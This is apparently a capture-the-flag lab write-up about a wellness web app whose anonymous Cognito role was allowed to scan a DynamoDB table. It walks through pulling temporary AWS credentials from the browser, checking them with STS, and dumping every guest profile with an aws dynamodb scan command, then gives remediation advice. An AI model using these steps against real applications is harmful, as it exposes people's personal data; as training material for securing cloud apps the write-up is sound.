BYTE LOTUS WELLNESS — AWS CLOUD SECURITY ASSESSMENT

📁 Mission Overview

The Byte Lotus Wellness application provides a guest wellness dashboard without requiring users to create an account.

Instead of traditional authentication, visitors are automatically issued temporary AWS credentials through an Amazon Cognito Identity Pool.

The application uses these credentials directly from the browser to access an Amazon DynamoDB database containing guest wellness profiles.

Finding: The unauthenticated Cognito role had excessive DynamoDB permissions, allowing anonymous users to enumerate the entire guest database.

🔎 Reconnaissance

Reviewing the JavaScript source revealed the AWS configuration: 


const IDENTITY_POOL_ID =
"us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";

const AWS_REGION =
"us-east-1";

const TABLE_NAME =
"complimentary-GuestWellnessProfiles";

The application initialized AWS credentials through Cognito: 


AWS.config.credentials =
new AWS.CognitoIdentityCredentials({
    IdentityPoolId: IDENTITY_POOL_ID,
});

This confirmed that anonymous visitors were receiving AWS credentials.

DynamoDB Query Logic 


dynamodb.getItem(
{
    TableName: TABLE_NAME,

    Key:
    {
        guest_id:
        {
            S: guestId()
        }
    }
}
)

The guest identifier was generated and stored in the browser: 


localStorage.getItem(
    "byteLotusGuestId"
)

Example value: 


guest-4pasao8w

The application was directly communicating with AWS services from the client.

🔐 Obtaining AWS Credentials

Using the browser developer console: 


AWS.config.credentials

revealed temporary Cognito credentials: 


AccessKeyId:
ASIA************

IdentityId:
us-east-1:4d571309-b00e-cfb7-952b-503468c87b00

The credentials were issued to: 


complimentary-cognito-unauth-role
Anonymous users successfully obtained AWS permissions.

🪪 Identity Verification

The temporary credentials were verified using AWS STS: 


aws sts get-caller-identity

Response: 


{
    "UserId":
    "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",

    "Account":
    "332173347248",

    "Arn":
    "arn:aws:sts::332173347248:assumed-role/

The session was confirmed to belong to the unauthenticated Cognito role.

🧪 Permission Testing

Testing Current Guest Access 


aws dynamodb get-item \
--table-name complimentary-GuestWellnessProfiles \
--key '{"guest_id":{"S":"guest-4pasao8w"}}' \
--region us-east-1

Result: 


{}

The generated guest ID did not contain a profile.

Testing Table Metadata Access 


aws dynamodb describe-table \
--table-name complimentary-GuestWellnessProfiles \
--region us-east-1

Response: 


AccessDeniedException

The role was restricted from inspecting table metadata.

💥 Exploitation

The critical test was whether anonymous users could enumerate the database. 


aws dynamodb scan \
--table-name complimentary-GuestWellnessProfiles \
--region us-east-1

The command succeeded and returned every guest profile stored in DynamoDB.

🚨 Vulnerability Analysis

Over-Permissive AWS Cognito Unauthenticated Role

The application intended to provide each visitor access only to their own wellness profile. 


Anonymous Visitor

        |

        v

Own Guest Profile Only

However, the IAM permissions allowed: 


Anonymous Visitor

        |

        v

DynamoDB Scan

        |

        v

All Guest Profiles

The unauthenticated Cognito role was trusted with excessive DynamoDB access.

📊 Impact

  • Anonymous users could obtain AWS credentials.
  • The Cognito role could enumerate the entire database.
  • Guest profiles were exposed without authentication.
  • Sensitive information was disclosed.

Exposed Data

  • Names
  • Email addresses
  • Phone numbers
  • Locations
  • Private notes
  • Password fields

🛠 Remediation

  1. Remove unnecessary DynamoDB permissions from unauthenticated users.
  2. Prevent anonymous roles from using: 
    
dynamodb:Scan
  3. Restrict access to only the user's own partition key.
  4. Never store plaintext passwords in DynamoDB.
  5. Move authorization logic to a trusted backend service.

🏁 Conclusion

The Byte Lotus Wellness application suffered from an overly permissive AWS Cognito unauthenticated role.

Although visitors did not require accounts, they were still granted AWS credentials capable of scanning the entire DynamoDB guest database.

By abusing excessive DynamoDB permissions, an attacker could retrieve all guest profiles and obtain the challenge flag:

THM{fL4G_R3D4CT3D}
